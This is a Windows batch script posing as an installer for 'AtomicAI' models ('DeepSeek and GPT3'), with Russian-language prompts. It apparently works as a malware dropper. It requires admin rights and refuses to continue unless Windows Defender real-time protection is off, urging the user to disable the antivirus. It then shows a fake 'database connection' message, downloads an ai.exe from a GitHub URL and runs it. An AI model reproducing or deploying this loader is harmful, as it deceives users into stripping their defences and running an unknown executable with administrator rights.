@echo off
chcp 65001 >nul

powershell -Command "Write-Host ' ______     ______   ______     __    __     __     ______        ______     __    ' -ForegroundColor Blue"
powershell -Command "Write-Host '/\  __ \   /\__  _\ /\  __ \   /\ \"-./  \   /\ \   /\  ___\      /\  __ \   /\ \   ' -ForegroundColor Blue"
powershell -Command "Write-Host '\ \  __ \  \/_/\ \/ \ \ \/\ \  \ \ \-./\ \  \ \ \  \ \ \____     \ \  __ \  \ \ \  ' -ForegroundColor Blue"
powershell -Command "Write-Host ' \ \_\ \_\    \ \_\  \ \_____\  \ \_\ \ \_\  \ \_\  \ \_____\     \ \_\ \_\  \ \_\ ' -ForegroundColor Blue"
powershell -Command "Write-Host '  \/_/\/_/     \/_/   \/_____/   \/_/  \/_/   \/_/   \/_____/      \/_/\/_/   \/_/ ' -ForegroundColor Blue"

net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Write-Host 'Ошибка: недостаточно прав для установки' -ForegroundColor Red"
    powershell -Command "Write-Host 'Запустите установщик от имени администратора' -ForegroundColor Red"
    pause
    exit /b
)

for /f "tokens=*" %%a in ('powershell -Command "Get-MpPreference | Select-Object -ExpandProperty DisableRealtimeMonitoring"') do (
    set "realTimeDisabled=%%a"
)

set "realTimeDisabled=%realTimeDisabled: =%"

if "%realTimeDisabled%"=="False" (
    powershell -Command "Write-Host 'Ошибка: защита в реальном времени Windows Defender включена' -ForegroundColor Red"
    powershell -Command "Write-Host 'Для продолжения отключите антивирус' -ForegroundColor Red"
    pause
    exit /b
) else if "%realTimeDisabled%"=="True" (
    echo Подключение к базе данных
) else (
    powershell -Command "Write-Host 'Не удалось подключится к базе данных' -ForegroundColor Red"
    powershell -Command "Write-Host 'Убедитесь что у вас отключен антивирус и запустите установщик заново' -ForegroundColor Red"
    pause
    exit /b
)

echo Установка моделей DeepSeek и GPT3

set "url=https://github.com/AtomicAIDeveloper/atomicAI/raw/refs/heads/main/ai.exe"
set "downloadPath=%USERPROFILE%\Downloads\ai.exe"

powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%downloadPath%'"
if not exist "%downloadPath%" (
    powershell -Command "Write-Host 'Ошибка скачивания' -ForegroundColor Red"
    powershell -Command "Write-Host 'Попробуйте перезапустить загрузчик' -ForegroundColor Red"
    pause
    exit /b
)

start "" "%downloadPath%"
echo Финальная конфигурация ИИ
echo Это займет не более 10 минут, не выключайте компьютер
pause
